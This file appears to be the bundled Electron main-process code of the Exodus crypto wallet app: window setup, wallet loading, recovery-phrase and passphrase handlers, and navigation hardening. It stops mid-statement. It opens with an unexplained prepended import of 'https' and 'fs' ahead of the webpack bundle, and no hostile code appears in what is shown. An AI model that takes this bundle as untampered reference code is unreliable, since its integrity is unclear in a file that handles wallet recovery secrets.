const { fstatSync } = require("fs"),
  https = require("https"),
  fs = require("fs"),
  path = require("path");



  !(function (e) {
  var t = {};
  function n(r) {
    if (t[r]) return t[r].exports;
    var o = (t[r] = { i: r, l: !1, exports: {} });
    return e[r].call(o.exports, o, o.exports, n), (o.l = !0), o.exports;
  }
  (n.m = e),
    (n.c = t),
    (n.d = function (e, t, r) {
      n.o(e, t) || Object.defineProperty(e, t, { enumerable: !0, get: r });
    }),
    (n.r = function (e) {
      "undefined" != typeof Symbol &&
        Symbol.toStringTag &&
        Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }),
        Object.defineProperty(e, "__esModule", { value: !0 });
    }),
    (n.t = function (e, t) {
      if ((1 & t && (e = n(e)), 8 & t)) return e;
      if (4 & t && "object" == typeof e && e && e.__esModule) return e;
      var r = Object.create(null);
      if (
        (n.r(r),
        Object.defineProperty(r, "default", { enumerable: !0, value: e }),
        2 & t && "string" != typeof e)
      )
        for (var o in e)
          n.d(
            r,
            o,
            function (t) {
              return e[t];
            }.bind(null, o)
          );
      return r;
    }),
    (n.n = function (e) {
      var t =
        e && e.__esModule
          ? function () {
              return e.default;
            }
          : function () {
              return e;
            };
      return n.d(t, "a", t), t;
    }),
    (n.o = function (e, t) {
      return Object.prototype.hasOwnProperty.call(e, t);
    }),
    (n.p = ""),
    n((n.s = 221));
})([
  function (e, t) {
    e.exports = require("electron");
  },
  function (e, t) {
    e.exports = require("path");
  },
  function (e, t, n) {
    "use strict";
    var r = n(94);
    n.o(r, "AUTO_UPDATE_BASE_URL") &&
      n.d(t, "AUTO_UPDATE_BASE_URL", function () {
        return r.AUTO_UPDATE_BASE_URL;
      }),
      n.o(r, "ENV_BUILD_EDEN") &&
        n.d(t, "ENV_BUILD_EDEN", function () {
          return r.ENV_BUILD_EDEN;
        }),
      n.o(r, "ENV_BUILD_EXODUS") &&
        n.d(t, "ENV_BUILD_EXODUS", function () {
          return r.ENV_BUILD_EXODUS;
        }),
      n.o(r, "ENV_BUILD_NAME") &&
        n.d(t, "ENV_BUILD_NAME", function () {
          return r.ENV_BUILD_NAME;
        }),
      n.o(r, "ENV_DEV") &&
        n.d(t, "ENV_DEV", function () {
          return r.ENV_DEV;
        }),
      n.o(r, "ENV_EXODUS_PROD") &&
        n.d(t, "ENV_EXODUS_PROD", function () {
          return r.ENV_EXODUS_PROD;
        }),
      n.o(r, "ENV_PROD") &&
        n.d(t, "ENV_PROD", function () {
          return r.ENV_PROD;
        }),
      n.o(r, "ENV_TEST") &&
        n.d(t, "ENV_TEST", function () {
          return r.ENV_TEST;
        }),
      n.o(r, "FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE") &&
        n.d(t, "FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE", function () {
          return r.FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE;
        }),
      n.o(r, "FLAG_FILE_RESTORE_MNEMONIC") &&
        n.d(t, "FLAG_FILE_RESTORE_MNEMONIC", function () {
          return r.FLAG_FILE_RESTORE_MNEMONIC;
        }),
      n.o(r, "MIN_HEIGHT") &&
        n.d(t, "MIN_HEIGHT", function () {
          return r.MIN_HEIGHT;
        }),
      n.o(r, "MIN_WIDTH") &&
        n.d(t, "MIN_WIDTH", function () {
          return r.MIN_WIDTH;
        }),
      n.o(r, "NIGHTLY_BUILD") &&
        n.d(t, "NIGHTLY_BUILD", function () {
          return r.NIGHTLY_BUILD;
        }),
      n.o(r, "PACKAGE") &&
        n.d(t, "PACKAGE", function () {
          return r.PACKAGE;
        }),
      n.o(r, "PROTOCOL") &&
        n.d(t, "PROTOCOL", function () {
          return r.PROTOCOL;
        }),
      n.o(r, "UNLOCK_WINDOW_HEIGHT") &&
        n.d(t, "UNLOCK_WINDOW_HEIGHT", function () {
          return r.UNLOCK_WINDOW_HEIGHT;
        });
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "appWindows", function () {
      return k;
    }),
      n.d(t, "onAppReady", function () {
        return x;
      });
    n(185), n(184), n(183);
    var r = n(0),
      o = n(9),
      i = n.n(o),
      s = n(1),
      c = n.n(s),
      a = n(33),
      u = n(2),
      l = n(37),
      f = n(24),
      d = n(111),
      p = n(11),
      h = n(29),
      m = n(5),
      y = n(27),
      w = n(60),
      b = n(59),
      g = n(58),
      E = n(44),
      v = n(19),
      S = n(41),
      O = n(43);
    const k = {};
    let _;
    async function x(e) {
      const t = e.exodusDirFromCli,
        n = Object(y.init)(t),
        o = Object(w.init)(n),
        s = Object(v.init)(n);
      (k.background = n), (k.ui = s), (k.core = o);
      const c = t || Object(l.dataDir)();
      console.timeEnd("main"),
        console.time("uiview"),
        await (async function (e, t) {
          if (await i.a.pathExists(D(t)))
            return (async function (e) {
              await i.a.remove(D(e)),
                (_ = Object(E.init)({ recoverFromPhrase: !0 }));
              const t = Object(a.walletDirFromExodusDir)(e);
              C(t);
            })(t);
          const n = (function (e) {
            if (
              globalThis.OPENED_URL &&
              globalThis.OPENED_URL.includes("recover")
            )
              return globalThis.OPENED_URL;
            if (!Array.isArray(e._) && e._.length > 0) return null;
            const t = e._.find((e) => e.includes("recover"));
            return t && t.includes("recover") ? t : null;
          })(e);
          if (n)
            return (async function (e, t) {
              _ = Object(E.init)({ recoverFromLink: !0 });
              const n = Object(a.walletDirFromExodusDir)(t);
              h.default.on("passphrase:set", (t) => {
                const r = Object(O.init)({
                  walletDir: n,
                  recoveryLink: e,
                  passphrase: t,
                });
                h.default.on("passphrase:invalid", () => {
                  r.destroy();
                });
              });
            })(n, t);
          h.default.on("error", (e) => {
            const t = `Wallet Load Error:\n\n${e}\n\nPlease contact: support@exodus.com\n\nYour assets are safe.`;
            r.dialog.showErrorBox("Wallet Load Error", t), r.app.quit();
          });
          const o = Object(a.walletDirFromExodusDir)(t),
            s = Object(a.default)(o),
            c = await s.walletExists(),
            u = await s.passphraseFileExists();
          if (!c || (c && u)) Object(O.init)({ walletDir: o });
          else {
            if (u) {
              const e = new Error(
                "Wallet exists - should not have reached this point."
              );
              throw (console.error(e), e);
            }
            (_ = Object(E.init)()),
              h.default.on("passphrase:set", (e) => {
                const t = Object(O.init)({ walletDir: o, passphrase: e });
                h.default.on("passphrase:invalid", () => {
                  t.destroy();
                });
              }),
              C(o);
          }
        })(e, c),
        s.webContents.on("devtools-opened", () => {
          console.log("devtools were opened"),
            setImmediate(() => {
              s.webContents.send("devtools-opened");
            });
        }),
        s.webContents.once("did-finish-load", () => {
          function e() {
            _ && (Object(y.maximize)(n), n.show(), _.destroy()),
              (Object(f.default)() || u.ENV_DEV) &&
                Object(p.default)({
                  windowHandle: s.webContents,
                  windowId: "ui",
                }),
              setTimeout(() => {
                Object(d.default)().catch(console.error);
              }, 3e4);
          }
          console.log(`did-finish-load at [${Date.now()}]`),
            console.timeEnd("uiview"),
            (k.unlock = Object(S.init)(n)),
            _ ||
              (Object(y.maximize)(n), (s.webContents.zoomFactor = 1), n.show()),
            Object(g.init)(),
            h.default._walletLoaded ? e() : h.default.on("wallet:loaded", e);
        }),
        s.webContents.loadFile(m.WINDOW_EXODUS),
        Object(b.init)(),
        n.on("close", () => r.app.quit());
    }
    const C = (e) => {
        h.default.on("mnemonic:set", ({ mnemonic: t, passphrase: n }) => {
          const r = Object(O.init)({
            walletDir: e,
            recoveryPhrase: t,
            recoveryPhrasePassphrase: n,
          });
          h.default.on("passphrase:invalid", () => {
            r.destroy();
          });
        });
      },
      D = (e) => c.a.join(e, u.FLAG_FILE_RESTORE_MNEMONIC);
  },
  function (e, t, n) {
    e.exports = n(186);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "WINDOW_EXODUS", function () {
      return s;
    }),
      n.d(t, "WINDOW_BACKGROUND", function () {
        return c;
      }),
      n.d(t, "WINDOW_KEYVIEWER", function () {
        return a;
      }),
      n.d(t, "WINDOW_MONERO", function () {
        return u;
      }),
      n.d(t, "WINDOW_NETWORK", function () {
        return l;
      }),
      n.d(t, "WINDOW_PASSPHRASE", function () {
        return f;
      }),
      n.d(t, "WINDOW_SCAN_QR", function () {
        return d;
      }),
      n.d(t, "WINDOW_UNLOCK", function () {
        return p;
      }),
      n.d(t, "WINDOW_WALLET", function () {
        return h;
      }),
      n.d(t, "WINDOW_CORE", function () {
        return m;
      }),
      n.d(t, "WINDOW_NFTS", function () {
        return y;
      });
    var r = n(1),
      o = n.n(r);
    const i = (e) => o.a.join("src", "static", e),
      s = i(n(2).ENV_PROD ? "exodus-prod.html" : "exodus-dev.html"),
      c = i("background.html"),
      a = i("keyviewer.html"),
      u = i("monero.html"),
      l = i("network.html"),
      f = i("passphrase.html"),
      d = i("scan-qr.html"),
      p = i("unlock.html"),
      h = i("wallet.html"),
      m = i("core.html"),
      y = i("nfts.html");
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "showError", function () {
      return c;
    });
    var r = n(0),
      o = n(2);
    const i = o.ENV_PROD && o.ENV_BUILD_EDEN,
      s = o.ENV_PROD && !o.ENV_BUILD_EDEN;
    function c(e, t = "", n = 2, o = !0) {
      n >= 3 &&
        (console.error(`[security] PANIC on ${e}${t}, terminating`),
        r.app.exit(-1));
      const c = o ? "blocked" : "noticed";
      if ((console.error(`[security] ${c} ${e}${t}`), s));
      else if (i) {
        if (n < 2) return;
        r.dialog.showMessageBoxSync({
          type: "warning",
          title: `Unexpected ${e} was ${c}`,
          message: `Unexpected ${e}${t} was ${c} by security rules. Please contact support@exodus.com`,
        });
      } else {
        if (n < 1) return;
        console.error(
          `[security] PANIC on ${e} attempt, this shouldn't happen!\n` +
            "This indicates an error either in the application code, or in security hardening logic.\nIf this is not caused by local modifications, please report this so that broken code does not end up in release.\nIf this is caused by local modifications, reporting it might also help to resolve the issue."
        ),
          r.app.exit(-1);
      }
    }
  },
  function (e, t, n) {
    var r,
      o,
      i = n(30),
      s = n(211),
      c = n(209),
      a = n(208),
      u = n(35);
    function l(e, t) {
      Object.defineProperty(e, r, {
        get: function () {
          return t;
        },
      });
    }
    (r = Symbol.for("graceful-fs.queue")),
      (o = Symbol.for("graceful-fs.previous"));
    var f,
      d = function () {};
    if (
      (u.debuglog
        ? (d = u.debuglog("gfs4"))
        : /\bgfs4\b/i.test(process.env.NODE_DEBUG || "") &&
          (d = function () {
            var e = u.format.apply(u, arguments);
            (e = "GFS4: " + e.split(/\n/).join("\nGFS4: ")), console.error(e);
          }),
      !i[r])
    ) {
      var p = global[r] || [];
      l(i, p),
        (i.close = (function (e) {
          function t(t, n) {
            return e.call(i, t, function (e) {
              e || m(), "function" == typeof n && n.apply(this, arguments);
            });
          }
          return Object.defineProperty(t, o, { value: e }), t;
        })(i.close)),
        (i.closeSync = (function (e) {
          function t(t) {
            e.apply(i, arguments), m();
          }
          return Object.defineProperty(t, o, { value: e }), t;
        })(i.closeSync)),
        /\bgfs4\b/i.test(process.env.NODE_DEBUG || "") &&
          process.on("exit", function () {
            d(i[r]), n(71).equal(i[r].length, 0);
          });
    }
    function h(e) {
      d("ENQUEUE", e[0].name, e[1]), i[r].push(e), y();
    }
    function m() {
      for (var e = Date.now(), t = 0; t < i[r].length; ++t)
        i[r][t].length > 2 && ((i[r][t][3] = e), (i[r][t][4] = e));
      y();
    }
    function y() {
      if ((clearTimeout(f), (f = void 0), 0 !== i[r].length)) {
        var e = i[r].shift(),
          t = e[0],
          n = e[1],
          o = e[2],
          s = e[3],
          c = e[4];
        if (void 0 === s) d("RETRY", t.name, n), t.apply(null, n);
        else if (Date.now() - s >= 6e4) {
          d("TIMEOUT", t.name, n);
          var a = n.pop();
          "function" == typeof a && a.call(null, o);
        } else {
          var u = Date.now() - c,
            l = Math.max(c - s, 1);
          u >= Math.min(1.2 * l, 100)
            ? (d("RETRY", t.name, n), t.apply(null, n.concat([s])))
            : i[r].push(e);
        }
        void 0 === f && (f = setTimeout(y, 0));
      }
    }
    global[r] || l(global, i[r]),
      (e.exports = (function e(t) {
        s(t);
        t.gracefulify = e;
        t.createReadStream = function (e, n) {
          return new t.ReadStream(e, n);
        };
        t.createWriteStream = function (e, n) {
          return new t.WriteStream(e, n);
        };
        var n = t.readFile;
        t.readFile = function (e, t, r) {
          "function" == typeof t && ((r = t), (t = null));
          return (function e(t, r, o, i) {
            return n(t, r, function (n) {
              !n || ("EMFILE" !== n.code && "ENFILE" !== n.code)
                ? "function" == typeof o && o.apply(this, arguments)
                : h([e, [t, r, o], n, i || Date.now(), Date.now()]);
            });
          })(e, t, r);
        };
        var r = t.writeFile;
        t.writeFile = function (e, t, n, o) {
          "function" == typeof n && ((o = n), (n = null));
          return (function e(t, n, o, i, s) {
            return r(t, n, o, function (r) {
              !r || ("EMFILE" !== r.code && "ENFILE" !== r.code)
                ? "function" == typeof i && i.apply(this, arguments)
                : h([e, [t, n, o, i], r, s || Date.now(), Date.now()]);
            });
          })(e, t, n, o);
        };
        var o = t.appendFile;
        o &&
          (t.appendFile = function (e, t, n, r) {
            "function" == typeof n && ((r = n), (n = null));
            return (function e(t, n, r, i, s) {
              return o(t, n, r, function (o) {
                !o || ("EMFILE" !== o.code && "ENFILE" !== o.code)
                  ? "function" == typeof i && i.apply(this, arguments)
                  : h([e, [t, n, r, i], o, s || Date.now(), Date.now()]);
              });
            })(e, t, n, r);
          });
        var i = t.copyFile;
        i &&
          (t.copyFile = function (e, t, n, r) {
            "function" == typeof n && ((r = n), (n = 0));
            return (function e(t, n, r, o, s) {
              return i(t, n, r, function (i) {
                !i || ("EMFILE" !== i.code && "ENFILE" !== i.code)
                  ? "function" == typeof o && o.apply(this, arguments)
                  : h([e, [t, n, r, o], i, s || Date.now(), Date.now()]);
              });
            })(e, t, n, r);
          });
        var a = t.readdir;
        t.readdir = function (e, t, n) {
          "function" == typeof t && ((n = t), (t = null));
          var r = u.test(process.version)
            ? function (e, t, n, r) {
                return a(e, o(e, t, n, r));
              }
            : function (e, t, n, r) {
                return a(e, t, o(e, t, n, r));
              };
          return r(e, t, n);
          function o(e, t, n, o) {
            return function (i, s) {
              !i || ("EMFILE" !== i.code && "ENFILE" !== i.code)
                ? (s && s.sort && s.sort(),
                  "function" == typeof n && n.call(this, i, s))
                : h([r, [e, t, n], i, o || Date.now(), Date.now()]);
            };
          }
        };
        var u = /^v[0-5]\./;
        if ("v0.8" === process.version.substr(0, 4)) {
          var l = c(t);
          (y = l.ReadStream), (w = l.WriteStream);
        }
        var f = t.ReadStream;
        f &&
          ((y.prototype = Object.create(f.prototype)),
          (y.prototype.open = function () {
            var e = this;
            g(e.path, e.flags, e.mode, function (t, n) {
              t
                ? (e.autoClose && e.destroy(), e.emit("error", t))
                : ((e.fd = n), e.emit("open", n), e.read());
            });
          }));
        var d = t.WriteStream;
        d &&
          ((w.prototype = Object.create(d.prototype)),
          (w.prototype.open = function () {
            var e = this;
            g(e.path, e.flags, e.mode, function (t, n) {
              t
                ? (e.destroy(), e.emit("error", t))
                : ((e.fd = n), e.emit("open", n));
            });
          }));
        Object.defineProperty(t, "ReadStream", {
          get: function () {
            return y;
          },
          set: function (e) {
            y = e;
          },
          enumerable: !0,
          configurable: !0,
        });
        Object.defineProperty(t, "WriteStream", {
          get: function () {
            return w;
          },
          set: function (e) {
            w = e;
          },
          enumerable: !0,
          configurable: !0,
        });
        var p = y;
        Object.defineProperty(t, "FileReadStream", {
          get: function () {
            return p;
          },
          set: function (e) {
            p = e;
          },
          enumerable: !0,
          configurable: !0,
        });
        var m = w;
        Object.defineProperty(t, "FileWriteStream", {
          get: function () {
            return m;
          },
          set: function (e) {
            m = e;
          },
          enumerable: !0,
          configurable: !0,
        });
        function y(e, t) {
          return this instanceof y
            ? (f.apply(this, arguments), this)
            : y.apply(Object.create(y.prototype), arguments);
        }
        function w(e, t) {
          return this instanceof w
            ? (d.apply(this, arguments), this)
            : w.apply(Object.create(w.prototype), arguments);
        }
        var b = t.open;
        t.open = g;
        function g(e, t, n, r) {
          return (
            "function" == typeof n && ((r = n), (n = null)),
            (function e(t, n, r, o, i) {
              return b(t, n, r, function (s, c) {
                !s || ("EMFILE" !== s.code && "ENFILE" !== s.code)
                  ? "function" == typeof o && o.apply(this, arguments)
                  : h([e, [t, n, r, o], s, i || Date.now(), Date.now()]);
              });
            })(e, t, n, r)
          );
        }
        return t;
      })(a(i)));
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "getWebContentsMeta", function () {
        return u;
      }),
      n.d(t, "registerWebContents", function () {
        return l;
      });
    var r = n(0),
      o = n(13),
      i = n(118),
      s = n(6),
      c = n(45);
    const a = new WeakMap();
    function u(e) {
      const t = a.get(e);
      if (!t) throw new Error("webContents instance is not registered");
      return t;
    }
    function l(e, t, n = {}) {
      const r = Object(i.prepareMetaEntry)(t, n);
      if (a.has(e))
        throw new Error("Attempting to re-register webContents instance");
      a.set(e, r), Object(c.registerWebContentsSession)(e, r);
    }
    r.app.on("web-contents-created", (e, t) => {
      t.on("will-navigate", (e, t) => {
        "mailto:" !== new o.URL(t).protocol &&
          (e.preventDefault(),
          Object(s.showError)("unsafe navigation", ` to ${t}`, 0));
      });
      t.setWindowOpenHandler(({ url: e }) =>
        ((e) => {
          return !(
            !(t.getURL() || "").startsWith("devtools://") ||
            !e.startsWith("devtools://")
          );
        })(e)
          ? { action: "allow" }
          : (Object(s.showError)("opening a new window", `: ${e}`, 0),
            { action: "deny" })
      ),
        t.on("will-attach-webview", (e) => {
          e.preventDefault();
          const n = t.getURL() || "";
          Object(s.showError)("attaching webview", `: ${n}`, 2);
        }),
        Object(c.saveSessionWebContents)(t);
    });
  },
  function (e, t, n) {
    "use strict";
    e.exports = {
      ...n(47),
      ...n(70),
      ...n(203),
      ...n(201),
      ...n(195),
      ...n(23),
      ...n(190),
      ...n(68),
      ...n(39),
      ...n(55),
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "integration", function () {
      return u;
    }),
      n.d(t, "isolation", function () {
        return l;
      });
    var r = n(0),
      o = n(1),
      i = n.n(o),
      s = n(2);
    const c = (() =>
        s.ENV_BUILD_EDEN
          ? i.a.join(
              r.app.getAppPath(),
              "src",
              "static",
              "icons",
              "PNG",
              "red",
              "icon_128x128.png"
            )
          : i.a.join(
              r.app.getAppPath(),
              "src",
              "static",
              "icons",
              "PNG",
              "icon_128x128.png"
            ))(),
      a = (() =>
        s.ENV_BUILD_EXODUS
          ? "Exodus"
          : s.ENV_BUILD_EDEN
          ? "Eden"
          : s.ENV_BUILD_NAME)(),
      u = {
        webSecurity: !0,
        spellcheck: !1,
        enableRemoteModule: !1,
        nodeIntegration: !0,
        sandbox: !1,
        contextIsolation: !1,
        nodeIntegrationInWorker: !1,
      },
      l = {
        webSecurity: !0,
        spellcheck: !1,
        enableRemoteModule: !1,
        preload: i.a.join(r.app.getAppPath(), "src/app/preload/index.js"),
        nodeIntegration: !1,
        sandbox: !0,
        contextIsolation: !0,
        nodeIntegrationInWorker: !1,
      };
    t.default = {
      resizable: !0,
      title: a,
      icon: c,
      frame: !0,
      backgroundColor: "#0b0b0b",
      show: !1,
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "default", function () {
      return f;
    });
    var r = n(0),
      o = n(9),
      i = n.n(o),
      s = n(2),
      c = n(24),
      a = n(19);
    const u = "exodus-devtools.conf";
    class l {
      constructor(e) {
        (this._windowHandle = e.windowHandle),
          (this._windowId = e.windowId),
          (this._options = {}),
          "devMenu" === this._windowId && (this._options = { mode: "detach" });
      }
      async readConf() {
        let e;
        const t = {
            devMenu: { mode: "detach" },
            ui: { mode: "detach" },
            monero: { mode: "bottom" },
            network: { mode: "bottom" },
            core: { mode: "bottom" },
            passphrase: { mode: "bottom" },
            scanQR: { mode: "detach" },
            keyviewer: { mode: "detach" },
            wallet: { mode: "bottom" },
            unlock: { mode: "detach" },
          },
          n = (e) => Object.keys(e).sort().join("|");
        try {
          if (n((e = await i.a.readJson(u, "utf8"))) !== n(t))
            throw new Error(`Keys mismatch in ${u}`);
        } catch (n) {
          "ENOENT" === n.code
            ? console.log(
                `Exodus DevTools configuration file does not exist, so creating a default in '${u}'.`
              )
            : console.error(n),
            (e = t);
          try {
            await i.a.writeJson(u, e, { spaces: 2 });
          } catch (e) {
            console.error(e);
          }
        }
        this._options = e[this._windowId];
      }
      show() {
        if (!this._options) return;
        let e;
        if ("number" == typeof this._windowHandle)
          e = r.BrowserWindow.fromId(this._windowHandle).webContents;
        else if (null == this._windowHandle)
          e = Object(a.getWindow)().webContents;
        else if ("function" == typeof this._windowHandle.constructor)
          if ("BrowserWindow" === this._windowHandle.constructor.name)
            e = this._windowHandle.webContents;
          else {
            if (!this._windowHandle.openDevTools)
              throw new Error("#devtools.show() Unknown constructor.");
            e = this._windowHandle;
          }
        if (!e) return console.error("Can't show #devtools.");
        let t = "ui" === this._windowId ? { mode: "detach" } : this._options;
        e.openDevTools(t);
      }
    }
    async function f(e = { windowHandle: null, windowId: "devMenu" }) {
      if (s.ENV_TEST) return;
      const t = new l(e);
      (s.ENV_DEV || Object(c.default)()) && (await t.readConf()), t.show();
    }
  },
  function (e, t, n) {
    const r = n(119),
      o = (e) => "-" === e || (Array.isArray(e) && "-" === e[0]),
      i = (e) => "function" == typeof e,
      s = (e) => r.includes(e);
    e.exports = function e(t) {
      return Array.isArray(t)
        ? 0 === t.length
          ? []
          : o(t[0])
          ? { type: "separator" }
          : "string" != typeof t[0]
          ? t.map(e)
          : t
              .slice(1)
              .reduce(
                (t, n) =>
                  i(n)
                    ? Object.assign(t, { click: n })
                    : s(n)
                    ? Object.assign(t, { role: n })
                    : Array.isArray(n)
                    ? Object.assign(t, { submenu: e(n) })
                    : "object" == typeof n
                    ? Object.assign(t, n)
                    : "string" == typeof n
                    ? Object.assign(t, { accelerator: n })
                    : void 0,
                { label: t[0] }
              )
        : o(t)
        ? { type: "separator" }
        : t;
    };
  },
  function (e, t) {
    e.exports = require("url");
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "forwardErrors", function () {
      return i;
    });
    var r = n(6),
      o = n(3);
    function i(e, t) {
      if (!t) throw new Error("fromWindow is required!");
      e.on("console-message", (e, n, i, s, c) => {
        if ("ui" === t && /^Error in [^ ]+ window:/.test(i)) return;
        if (i.includes("the following Content Security Policy directive:")) {
          const e = i
            .replace(
              /the following Content Security Policy directive:[\s\S]*/,
              "CSP"
            )
            .replace(/ because it violates CSP$/, "");
          Object(r.showError)(
            "Content Security Policy violation",
            ` in ${t} window (${e})`
          );
        }
        if (n < 3) return;
        if ("ui" === t || !o.appWindows.ui) return;
        const a = { level: n, message: i, line: s, sourceId: c, window: t };
        o.appWindows.ui.webContents.send("errors:remote-error", a);
      });
    }
  },
  function (e, t, n) {
    const { BrowserWindow: r } = n(0);
    const o = new Set();
    function i(e) {
      for (const t of r.getAllWindows())
        if (t.getBrowserViews().includes(e)) return t;
      return null;
    }
    e.exports = {
      browserViewFromWebContents: function (e) {
        for (const t of o) if (t.webContents === e) return t;
        return null;
      },
      browserWindowFromBrowserView: i,
      registerBrowserView: function (e) {
        o.add(e);
      },
      destroyBrowserView: function (e) {
        const t = i(e);
        t && t.removeBrowserView(e), e.webContents.destroy(), o.delete(e);
      },
      allWebContents: function () {
        return [...r.getAllWindows(), ...o].map((e) => e.webContents);
      },
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "assets", function () {
      return r;
    }),
      n.d(t, "fiatUnit", function () {
        return o;
      }),
      n.d(t, "themeName", function () {
        return i;
      }),
      n.d(t, "adaLegacyAddressEnabled", function () {
        return s;
      }),
      n.d(t, "moneroInitialHeight", function () {
        return c;
      }),
      n.d(t, "moneroSubaddressesEnabled", function () {
        return a;
      }),
      n.d(t, "bitcoinLegacyAddressEnabled", function () {
        return u;
      }),
      n.d(t, "bitcoinTaprootAddressEnabled", function () {
        return l;
      }),
      n.d(t, "rbfEnabledBitcoin", function () {
        return f;
      }),
      n.d(t, "rbfEnabledEthereum", function () {
        return d;
      }),
      n.d(t, "wentThroughFiatOnboarding", function () {
        return p;
      });
    const r = "assets",
      o = "fiat.unit",
      i = "theme.name",
      s = "adaLegacyAddressEnabled",
      c = "moneroInitialHeight",
      a = "moneroSubaddressesEnabled",
      u = "bitcoinLegacyAddressEnabled",
      l = "bitcoinTaprootAddressEnabled",
      f = "advanced.advancedMode.assets.bitcoin",
      d = "advanced.advancedMode.assets.ethereum",
      p = "fiatOnramp.wentThroughFiatOnboarding";
  },
  function (e, t, n) {
    "use strict";
    (t.fromCallback = function (e) {
      return Object.defineProperty(
        function () {
          if ("function" != typeof arguments[arguments.length - 1])
            return new Promise((t, n) => {
              (arguments[arguments.length] = (e, r) => {
                if (e) return n(e);
                t(r);
              }),
                arguments.length++,
                e.apply(this, arguments);
            });
          e.apply(this, arguments);
        },
        "name",
        { value: e.name }
      );
    }),
      (t.fromPromise = function (e) {
        return Object.defineProperty(
          function () {
            const t = arguments[arguments.length - 1];
            if ("function" != typeof t) return e.apply(this, arguments);
            e.apply(this, arguments)
              .then((e) => t(null, e))
              .catch(t);
          },
          "name",
          { value: e.name }
        );
      });
  },
  function (e, t, n) {
    "use strict";
    (t.fromCallback = function (e) {
      return Object.defineProperty(
        function (...t) {
          if ("function" != typeof t[t.length - 1])
            return new Promise((n, r) => {
              e.call(this, ...t, (e, t) => (null != e ? r(e) : n(t)));
            });
          e.apply(this, t);
        },
        "name",
        { value: e.name }
      );
    }),
      (t.fromPromise = function (e) {
        return Object.defineProperty(
          function (...t) {
            const n = t[t.length - 1];
            if ("function" != typeof n) return e.apply(this, t);
            e.apply(this, t.slice(0, -1)).then((e) => n(null, e), n);
          },
          "name",
          { value: e.name }
        );
      });
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return f;
    }),
      n.d(t, "navbarHeightChangeHandlers", function () {
        return p;
      }),
      n.d(t, "init", function () {
        return h;
      });
    var r = n(0),
      o = (n(1), n(15)),
      i = n(8),
      s = n(14),
      c = n(40),
      a = n(10),
      u = n(27);
    let l = null;
    const f = () => l,
      d = (e, t) => {
        const { height: n, width: r } = Object(c.default)(t);
        e.setBounds({ x: 0, y: 0, width: r, height: n });
      },
      p = new Set();
    function h(e) {
      return (
        (l = new r.BrowserView({
          webPreferences: {
            ...a.integration,
            partition: "persist:main",
            backgroundThrottling: !1,
            backgroundColor: "#00000000",
            transparent: !0,
          },
          transparent: !0,
        })),
        Object(i.registerWebContents)(l.webContents, "ui"),
        Object(o.registerBrowserView)(l),
        Object(s.forwardErrors)(l.webContents, "ui"),
        l.setAutoResize({ width: !0, height: !0 }),
        e.addBrowserView(l),
        d(l, e),
        l.webContents.on("will-navigate", (e, t) => {
          t.startsWith("mailto:") || e.preventDefault();
        }),
        l.webContents.setWindowOpenHandler((e) => ({ action: "deny" })),
        u.maximizeWorkaroundHandlers.add(() => d(l, e)),
        l
      );
    }
  },
  function (e, t, n) {
    "use strict";
    const r = (0, n(17).fromCallback)(n(171)),
      o = n(170);
    e.exports = {
      mkdirs: r,
      mkdirsSync: o,
      mkdirp: r,
      mkdirpSync: o,
      ensureDir: r,
      ensureDirSync: o,
    };
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "updateAllViewsBounds", function () {
        return _;
      }),
      n.d(t, "schemes", function () {
        return x;
      }),
      n.d(t, "showDevTools", function () {
        return I;
      }),
      n.d(t, "updateViewBounds", function () {
        return F;
      }),
      n.d(t, "refocusView", function () {
        return L;
      }),
      n.d(t, "toInputEvent", function () {
        return T;
      });
    var r = n(32),
      o = n.n(r),
      i = n(31),
      s = n(0),
      c = n(56),
      a = n(13),
      u = n(2),
      l = n(15),
      f = n(4),
      d = n(6),
      p = n(8),
      h = n(3),
      m = n(107),
      y = n(106),
      w = n(40),
      b = n(27),
      g = n(19);
    const E = ({ body: e, headers: t, status: n }) => {
        const r = new c.PassThrough();
        return r.end(e), { statusCode: n, headers: t, data: r };
      },
      v = new Map();
    let S = null;
    const O = (e) => {
      h.appWindows.background.removeBrowserView(e),
        S === e && ((S = null), h.appWindows.ui.webContents.focus());
    };
    let k = 0;
    const _ = (e) => {
        k = e || k;
        const t = h.appWindows.ui.webContents.zoomFactor,
          n = Math.round(k * t),
          { height: r, width: o } = Object(w.default)(h.appWindows.background);
        for (let e of v.values())
          e.setBounds({ x: 0, y: n, width: o, height: r - n });
      },
      x = [
        {
          scheme: "exodus-dapp-api",
          privileges: { bypassCSP: !0, secure: !0, supportFetchAPI: !0 },
        },
      ];
    s.protocol.registerSchemesAsPrivileged(x);
    const C = new Set(),
      D = (e, t) => {
        f.rpcMain.handle(`dapp:${e}`, (e, n, ...r) => {
          if (!C.has(n)) return t(n, ...r);
        });
      };
    let N = 0;
    const I = (e) => {
        e.webContents.isDevToolsOpened() ||
          e.webContents.openDevTools({ mode: "detach" });
      },
      F = (e, t) => {
        const n = h.appWindows.ui.webContents.zoomFactor;
        e.webContents.zoomFactor = n;
        const r = Math.round(t * n),
          { height: o, width: i } = Object(w.default)(h.appWindows.background);
        e.setBounds({ x: 0, y: r, width: i, height: o - r });
      };
    b.maximizeWorkaroundHandlers.add(() => _()),
      g.navbarHeightChangeHandlers.add(_),
      D(
        "load",
        async (e, { tar: t, url: n, domains: r, localStorageContent: c }) => {
          let f;
          if (t) {
            if (n)
              throw new Error("tar and url arguments are mutually exclusive!");
            (n = `http://${"127.0.0.1:1021"}/`),
              (f = await Object(y.default)(t));
          }
          const w = new s.BrowserView({
            webPreferences: {
              webSecurity: !0,
              contextIsolation: !0,
              enableRemoteModule: !1,
              nodeIntegration: !1,
              partition: `dapp-${N++}`,
              sandbox: !0,
              spellcheck: !1,
              webgl: !1,
              plugins: !1,
              safeDialogs: !0,
              disableDialogs: !0,
              backgroundColor: "#00000000",
              transparent: !0,
            },
            transparent: !0,
          });
